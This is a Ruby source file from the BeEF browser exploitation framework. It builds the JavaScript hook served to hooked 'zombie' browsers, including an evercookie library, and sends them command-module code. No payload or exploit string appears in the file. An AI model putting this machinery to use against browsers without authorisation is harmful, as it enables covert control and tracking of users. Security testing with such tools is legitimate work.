module BeEF
module Server
module Modules
  
  #
  # Purpose: avoid rewriting several times the same code.
  #
  module Common
    
    #
    # Builds the default beefjs library (all default components of the library).
    #
    # @param: {Object} the hook session id
    # @param: {Boolean} if the framework is already loaded in the hooked browser
    #
    def build_beefjs!(req_host)

      # set up values required to construct beefjs
      beefjs = '' #  init the beefjs string (to be sent as the beefjs file)
      beefjs_path = "#{$root_dir}/modules/beefjs/" # location of sub files      
      js_sub_files = %w(lib/jquery-1.5.min.js lib/evercookie.js beef.js browser.js browser/cookie.js session.js os.js dom.js logger.js net.js updater.js encode/base64.js net/local.js init.js)

      # construct the beefjs string from file(s)
      js_sub_files.each {|js_sub_file_name|
        js_sub_file_abs_path = beefjs_path + js_sub_file_name # construct absolute path
        beefjs << (File.read(js_sub_file_abs_path) + "\n\n") # concat each js sub file
      }
      
      # create the config for the hooked browser session
      config = BeEF::Configuration.instance
      hook_session_name = config.get('hook_session_name')
      hook_session_config = BeEF::HttpHookServer.instance.to_h

      # if http_host="0.0.0.0" in config ini, use the host requested by client
      if hook_session_config['beef_host'].eql? "0.0.0.0" 
        hook_session_config['beef_host'] = req_host 
        hook_session_config['beef_url'].sub!(/0\.0\.0\.0/, req_host)  
      end
      
      # populate place holders in the beefjs string and set the response body
      eruby = Erubis::FastEruby.new(beefjs)
      @body << eruby.evaluate(hook_session_config)
  
    end
    
    #
    # Finds the path to js components
    #
    def find_beefjs_component_path(component)
      component_path = '/'+component
      component_path.gsub!(/beef./, '')
      component_path.gsub!(/\./, '/')
      component_path.replace "#{$root_dir}/modules/beefjs/#{component_path}.js"
      
      return false if not File.exists? component_path
      
      component_path
    end
    
    #
    # Builds missing beefjs components.
    #
    # Ex: build_missing_beefjs_components(['beef.net.local', 'beef.net.requester'])
    #
    def build_missing_beefjs_components(beefjs_components)
      # verifies that @beef_js_cmps is not nil to avoid bugs
      @beef_js_cmps = '' if @beef_js_cmps.nil?
      
      if beefjs_components.is_a? String
        beefjs_components_path = find_beefjs_component_path(beefjs_components)
        raise "Invalid component: could not build the beefjs file" if not beefjs_components_path
        beefjs_components = {beefjs_components => beefjs_components_path} 
      end
      
      beefjs_components.keys.each {|k|
        next if @beef_js_cmps.include? beefjs_components[k]
        
        # path to the component
        component_path = beefjs_components[k]
        
        # we output the component to the hooked browser
        @body << File.read(component_path)+"\n\n"
        
        # finally we add the component to the list of components already generated so it does not
        # get generated numerous times.
        if @beef_js_cmps.eql? ''
          @beef_js_cmps = component_path
        else
          @beef_js_cmps += ",#{component_path}"
        end
      }
    end
    
    #
    # Adds the command module instructions to the http response.
    #
    def add_command_instructions(command, zombie)

      raise WEBrick::HTTPStatus::BadRequest, "zombie is nil" if zombie.nil?
      raise WEBrick::HTTPStatus::BadRequest, "zombie.session is nil" if zombie.session.nil?
      raise WEBrick::HTTPStatus::BadRequest, "zombie is nil" if command.nil?
      raise WEBrick::HTTPStatus::BadRequest, "zombie.session is nil" if command.command_module_id.nil?

      # flag that the command has been sent to the hooked browser
      command.instructions_sent = true 
      command.save
      
      # get the command module
      command_module = BeEF::Models::CommandModule.first(:id => command.command_module_id)      
      raise WEBrick::HTTPStatus::BadRequest, "command_module is nil" if command_module.nil?
      raise WEBrick::HTTPStatus::BadRequest, "command_module.path is nil" if command_module.path.nil?

      klass = File.basename command_module.path, '.rb'

      @guard.synchronize {
        command_module = BeEF::Modules::Commands.const_get(klass.capitalize).new
        command_module.command_id = command.id
        command_module.session_id = zombie.session
        command_module.build_datastore(command.data)
        command_module.pre_send
        
        build_missing_beefjs_components(command_module.beefjs_components) if not command_module.beefjs_components.empty?
        
        @body << command_module.output + "\n\n"
        
        puts "+ Hooked browser #{zombie.ip} sent command module #{klass}" if @cmd_opts[:verbose]
        
      }
    end
    
    #
    # Executes every plugins in the framework.
    #
    def execute_plugins!

    end

  end
  
end
end
end